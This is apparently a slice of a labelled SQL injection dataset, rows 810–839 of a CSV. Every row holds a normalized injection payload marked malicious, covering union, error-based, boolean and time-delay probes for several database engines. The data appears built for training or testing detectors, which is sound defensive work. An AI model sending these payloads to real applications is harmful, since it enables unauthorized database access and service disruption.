row_index,payload_norm,label,sqli_type_hint
810,"1 ) as clye where 7842 = 7842 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
811,"-4860' ) as azyx where 6901 = 6901 union all select 6901,6901,6901,6901,6901#",1,
812,"1%' ) ) union all select null,null,null,null,null#",1,
813,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 6866 = 6866",1,
814,1 ) as boed where 6787 = 6787,1,
815,"1"" ) ) as vdbf where 7969 = 7969 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1,
816,"1"" where 4281 = 4281",1,
817,"1%"" ) and 8024 = 3560--",1,
818,"1"" ) and ( 5452 = 6050 ) *6050 and ( ""ciyc"" like ""ciyc",1,
819,"1"" ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
820,"1', ( select ( case when ( 9443 = 9443 ) then sleep ( 5 ) else 9443* ( select 9443 from information_schema.character_sets ) end ) )",1,
821,"1'|| ( select 'rawn' from dual where 4988 = 4988 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) ||'",1,
822,"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",1,
823,"1"" ) ) as dnhd where 2657 = 2657 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1,
824,-9534%' or 3038 = 3038,1,
825,"1' ) where 6941 = 6941 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1,
826,select ( case when ( 7978 = 6009 ) then 7978 else 1/ ( select 0 ) end ) --,1,
827,"-1212%' ) or make_set ( 7588 = 2306,2306 ) and ( '%' = '",1,
828,"1 where 5466 = 5466 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
829,"-3794' ) union all select 2485,2485,2485,2485,2485--",1,
830,"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'gmil' = 'gmil",1,
831,"1' and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
832,"-6400 ) ) union all select 4650,4650,4650--",1,
833,"1'|| ( select 'rttq' from dual where 7368 = 7368 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) ||'",1,
834,"1"" ) as ztkr where 1532 = 1532",1,
835,"1' ) where 9842 = 9842 union all select null,null,null,null,null,null,null,null#",1,
836,"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'fbsi' like 'fbsi",1,
837,"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and 'uwep' = 'uwep",1,
838,"-4291"" ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""xyhi"" = ""xyhi",1,
839,"1' in boolean mode ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) #",1,
